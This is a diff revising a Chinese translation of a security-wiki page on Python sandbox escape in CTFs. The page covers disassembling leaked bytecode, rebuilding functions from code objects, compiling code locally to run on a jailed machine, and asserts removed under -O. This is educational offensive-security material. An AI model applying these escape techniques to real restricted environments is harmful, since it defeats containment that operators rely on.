-[**查看更多获取 globals 的位置**](#globals-and-locals)
+[**在此查看其他获取 globals 的位置**](#globals-and-locals)
 
 ### **访问函数代码**
 
@@ -1069,7 +1081,7 @@ dis.dis(get_flag)
              47 RETURN_VALUE
 ```
 
-注意，**如果无法在 python sandbox 中导入 `dis`**，你可以获取函数的 **bytecode**（`get_flag.func_code.co_code`），并在本地对其进行反汇编。你看不到正在加载的变量（`LOAD_CONST`）的内容，但可以根据（`get_flag.func_code.co_consts`）推测，因为 `LOAD_CONST` 也会指出正在加载的变量的偏移量。
+注意，**如果你无法在 Python 沙箱中导入 `dis`**，可以获取该函数的**字节码**（`get_flag.func_code.co_code`），并在本地对其进行反汇编。你看不到被加载变量（`LOAD_CONST`）的内容，但可以根据（`get_flag.func_code.co_consts`）推测，因为 `LOAD_CONST` 也会指出被加载变量的偏移量。
 
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
@@ -1095,8 +1107,8 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 
 ## 编译 Python
 
-现在，假设你可以**dump 无法执行的函数的信息**，但你**需要**执行它。\
-如以下示例所示，你**可以访问该函数的 code object**，但仅通过阅读反汇编内容，你**不知道如何计算 flag**（_设想一个更复杂的 `calc_flag` 函数_）。<sup>[[3]](#references)</sup>
+现在，让我们设想一下，不知何故，你可以 **dump 一个无法执行的函数的信息**，但你 **需要** **执行** 它。\
+就像下面的示例，你 **可以访问该函数的代码对象**，但仅仅阅读反汇编内容，你 **不知道如何计算 flag**（_想象一个更复杂的 `calc_flag` 函数_）。<sup>[[3]](#references)</sup>
 
 ```python
 def get_flag(some_input):
@@ -1113,7 +1125,7 @@ def get_flag(some_input):
 
 ### 创建 code object
 
-首先，我们需要知道**如何创建并执行 code object**，这样才能创建一个来执行我们泄露的函数：
+首先，我们需要了解**如何创建并执行 code object**，这样才能创建一个 code object 来执行我们泄露的函数：
 
 ```python
 code_type = type((lambda: None).__code__)
@@ -1135,7 +1147,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 
 > [!TIP]
-> 根据 Python 版本的不同，`code_type` 的**参数**顺序可能会有所不同。要确定你正在运行的 Python 版本中参数的顺序，最好的方法是运行：
+> 根据 Python 版本的不同，`code_type` 的 **参数**顺序可能有所不同。要确认你正在运行的 Python 版本中参数的顺序，最好的方法是运行：
 >
 > ```
 > import types
@@ -1143,7 +1155,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 > 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
 > ```
 
-### 重建一个 leaked 函数
+### 重建一个 leaked function
 
 > [!WARNING]
 > 在下面的示例中，我们将直接从函数代码对象中获取重建函数所需的所有数据。在**真实示例**中，你需要 leak 执行函数 **`code_type`** 所需的所有**值**。
@@ -1161,8 +1173,8 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 
 ### 绕过防御
 
-在本文开头的示例中，你可以看到**如何使用 `compile` 函数执行任意 Python 代码**。这很有意思，因为你可以用**一行代码**执行**完整脚本**，包括循环等内容（我们也可以使用 **`exec`** 实现同样的效果）。\
-无论如何，有时在本地机器上**创建**一个**编译后的对象**，然后在 **CTF 机器**上执行它可能会很有用（例如，因为 CTF 环境中没有 `compiled` 函数）。
+在这篇文章开头的前几个示例中，你可以看到**如何使用 `compile` 函数执行任意 Python 代码**。这很有意思，因为你可以用**一行代码**（我们也可以使用 **`exec`**）**执行完整脚本**，包括循环等内容。\
+不过，有时在本地机器上**创建**一个**编译后的对象**，再在 **CTF 机器**上执行它可能会很有用（例如，因为 CTF 环境中没有 `compiled` 函数）。
 
 例如，让我们手动编译并执行一个读取 _./poc.py_ 的函数：
 
@@ -1193,7 +1205,7 @@ codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module
 function_type(codeobj, mydict, None, None, None)()
 ```
 
-如果无法访问 `eval` 或 `exec`，可以创建一个**合规的函数**，但直接调用它通常会失败，并提示：_constructor not accessible in restricted mode_。因此，你需要一个**不在受限环境中的函数来调用这个函数**。
+如果无法访问 `eval` 或 `exec`，你可以创建一个**合适的函数**，但直接调用它通常会失败，并报错：_受限模式下无法访问 constructor_。因此，你需要一个**不在受限环境中的函数来调用这个函数**。
 
 ```python
 #Compile a regular print
@@ -1203,11 +1215,11 @@ f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdi
 f(42)
 ```
 
-## 反编译已编译的 Python
+## 反编译编译后的 Python
 
 使用 [**https://www.decompiler.com/**](https://www.decompiler.com) 等工具可以**反编译**给定的已编译 Python 代码。
 
-**查看此教程**：
+**请查看此教程**：
 
 
 {{#ref}}
@@ -1218,7 +1230,7 @@ f(42)
 
 ### Assert
 
-使用参数 `-O` 启用优化运行 Python 时，会移除 assert 语句以及任何依赖 **debug** 值的条件代码。\
+使用参数 `-O` 启用优化执行 Python 时，会移除 assert 语句以及任何依赖 **debug** 值的代码。\
 因此，像下面这样的检查：<sup>[[6]](#references)</sup>
 
 ```python
@@ -1235,21 +1247,22 @@ def check_permission(super_user):
 ## References
 
 - [1] [Pyjail](https://lbarman.ch/blog/pyjail/)
-- [2] [Python 沙箱逃逸 - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
-- [3] [逃逸 Python 沙箱（NdH 2013 资格赛 writeup）](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
-- [4] [Python“沙箱”逃逸](https://gynvael.coldwind.pl/n/python_sandbox_escape)
+- [2] [Python Sandbox Escape - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
+- [3] [逃逸 Python sandbox（NdH 2013 quals writeup）](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
+- [4] [Python 'sandbox' 逃逸](https://gynvael.coldwind.pl/n/python_sandbox_escape)
 - [5] [Eval 确实很危险](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
 - [6] [断言如何让你遭到攻击](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 - [7] [CVE-2023-33733（ReportLab rl_safe_eval 表达式求值 RCE）– NVD](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
 - [8] [c53elyas/CVE-2023-33733 PoC 和 write-up](https://github.com/c53elyas/CVE-2023-33733)
-- [9] [0xdf：University (HTB) – 利用 xhtml2pdf/ReportLab CVE-2023-33733 获取 RCE](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
-- [10] [0xdf：HTB Interpreter – Mirth Connect XStream RCE、Mirth hash 破解，以及 Flask f-string eval 权限提升](https://0xdf.gitlab.io/2026/05/30/htb-interpreter.html)
+- [9] [0xdf: University (HTB) – 利用 xhtml2pdf/ReportLab CVE-2023-33733 获取 RCE](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
+- [10] [0xdf: HTB Interpreter – Mirth Connect XStream RCE、Mirth hash 破解和 Flask f-string eval 权限提升](https://0xdf.gitlab.io/2026/05/30/htb-interpreter.html)
 - [11] [SECCON CTF 2022 Quals：作者 writeups（英文）](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)
-- [12] [LLM RCE 剖析 - CyberArk 威胁研究博客](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce)
-- [13] [BuckeyeCTF 2024 作者 writeups](https://corgi.rip/posts/buckeye-writeups/)
+- [12] [LLM RCE 剖析 - CyberArk Threat Research Blog](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce)
+- [13] [BuckeyeCTF 2024 作者 Writeups](https://corgi.rip/posts/buckeye-writeups/)
 - [14] [GeeksforGeeks – Python 中 str.format() 的漏洞](https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/)
 - [15] [ur4ndom – GCTF 2022 Treebox](https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/)
-- [16] [checkoway.net - 随笔 - Pickle](https://checkoway.net/musings/pickle)
-- [17] [突破 AWS MCP Python 沙箱](https://xplo1t-sec.github.io/posts/breaking-the-aws-mcp-python-sandbox/)
+- [16] [checkoway.net - 随想 - Pickle](https://checkoway.net/musings/pickle)
+- [17] [突破 AWS MCP Python Sandbox](https://xplo1t-sec.github.io/posts/breaking-the-aws-mcp-python-sandbox/)
 - [18] [PEP 634 - 结构化模式匹配：规范](https://peps.python.org/pep-0634/#class-patterns)
+- [19] [Python 文档 - 内置函数：`eval()` 和 `str()`](https://docs.python.org/3/library/functions.html)
 {{#include ../../../banners/hacktricks-training.md}}
